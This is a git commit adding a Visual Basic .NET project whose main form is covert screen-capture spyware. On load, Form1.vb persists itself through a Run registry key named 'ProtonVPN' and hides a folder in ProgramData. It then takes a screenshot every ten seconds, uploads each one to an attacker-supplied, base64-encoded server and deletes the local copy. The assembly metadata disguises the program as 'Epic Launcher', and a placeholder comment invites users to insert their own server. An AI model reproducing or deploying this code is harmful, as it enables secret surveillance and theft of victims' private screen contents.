3afb39d7936d845b8ef7372536afa3697f035ab4
Mr Fr05t <56921712+mrfr05t@users.noreply.github.com>
2019-11-07 21:53:02 +0530

    No new changes!

---
+++ Mr.Peter/Form1.vb
@@ -0,0 +1,44 @@
+﻿Imports System.IO
+Imports System.Net
+Imports System.Text
+Imports System.Threading
+
+Public Class Form1
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Dim folder As String = "C:\ProgramData\" & Environment.MachineName
+        My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
+                                      "ProtonVPN", Application.ExecutablePath)
+        Dim todaysdate As String = String.Format("{0:dd-MM-yyyy}", DateTime.Now)
+        Dim server As String = BaseDecode1("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX") 'YOUR SERVER URL IN BASE64 ENCODED'
+        Dim webClient As New System.Net.WebClient
+        Dim result2 As String = webClient.DownloadString(server & "processor.php?folder=" & Environment.MachineName)
+        Dim result3 As String = webClient.DownloadString(server & "processor.php?folder=" & Environment.MachineName & "/" & todaysdate)
+        While 1
+            Try
+                System.IO.Directory.CreateDirectory("C:\ProgramData\" & Environment.MachineName)
+                FileSystem.SetAttr(folder, FileAttribute.System + FileAttribute.Hidden)
+                FloridaCalling("C:\ProgramData\" & Environment.MachineName & "\" & DateTime.Now.ToString("HH-mm-ss") & ".jpg")
+                My.Computer.Network.UploadFile("C:\ProgramData\" & Environment.MachineName & "\" & DateTime.Now.ToString("HH-mm-ss") & ".jpg", server & "processor.php?path=" & Environment.MachineName & "/" & todaysdate & "/")
+                IO.File.Delete("C:\ProgramData\" & Environment.MachineName & "\" & DateTime.Now.ToString("HH-mm-ss") & ".jpg")
+            Catch ex As Exception
+            End Try
+            Thread.Sleep(10000) 'CHANGE THE LOOP SECONDS AS PER YOUR NEED'
+        End While
+    End Sub
+    Public Function FloridaCalling(ByVal path As String) As Boolean
+        Dim screenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
+        Dim screenGrab As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
+        Dim g As Graphics = Graphics.FromImage(screenGrab)
+        g.CopyFromScreen(New Point(0, 0), New Point(0, 0), screenSize)
+        screenGrab.Save(path, Imaging.ImageFormat.Jpeg)
+        Return True
+    End Function
+    Public Function BaseDecode1(ByVal str As String) As String
+        Dim base64Encoded As String = str
+        Dim base64Decoded As String
+        Dim data() As Byte
+        data = System.Convert.FromBase64String(base64Encoded)
+        base64Decoded = System.Text.ASCIIEncoding.ASCII.GetString(data)
+        Return base64Decoded
+    End Function
+End Class
---
+++ Mr.Peter/My Project/AssemblyInfo.vb
@@ -0,0 +1,35 @@
+﻿Imports System
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+
+' General Information about an assembly is controlled through the following 
+' set of attributes. Change these attribute values to modify the information
+' associated with an assembly.
+
+' Review the values of the assembly attributes
+
+<Assembly: AssemblyTitle("Epic Launcher")> 
+<Assembly: AssemblyDescription("Epic Launcher")> 
+<Assembly: AssemblyCompany("Copyright © Epic Launcher. 2018")> 
+<Assembly: AssemblyProduct("Epic Launcher.exe")> 
+<Assembly: AssemblyCopyright("Copyright © Epic Launcher2017")> 
+<Assembly: AssemblyTrademark("Copyright © Epic Launcher 2017")> 
+
+<Assembly: ComVisible(False)>
+
+'The following GUID is for the ID of the typelib if this project is exposed to COM
+<Assembly: Guid("ffb45027-0e51-45b1-b2bb-f0e20c93460c")> 
+
+' Version information for an assembly consists of the following four values:
+'
+'      Major Version
+'      Minor Version 
+'      Build Number
+'      Revision
+'
+' You can specify all the values or you can default the Build and Revision Numbers 
+' by using the '*' as shown below:
+' <Assembly: AssemblyVersion("1.0.*")> 
+
+<Assembly: AssemblyVersion("1.0.0.0")> 
+<Assembly: AssemblyFileVersion("1.0.0.0")> 
